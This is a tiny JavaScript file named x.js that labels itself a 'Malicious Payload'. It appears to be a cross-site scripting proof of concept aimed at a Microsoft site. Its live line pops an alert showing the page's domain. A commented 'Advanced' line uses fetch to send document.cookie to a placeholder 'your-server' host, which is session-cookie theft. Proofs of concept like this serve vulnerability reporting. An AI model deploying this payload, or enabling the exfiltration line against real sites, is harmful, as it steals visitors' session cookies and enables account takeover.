// x.js (Malicious Payload)
// Simple PoC: Alert box
alert("🔥 Microsoft XSS PoC Triggered! Document: " + document.domain);

// Advanced (Optional):
// fetch("https://your-server/log?cookie=" + document.cookie);
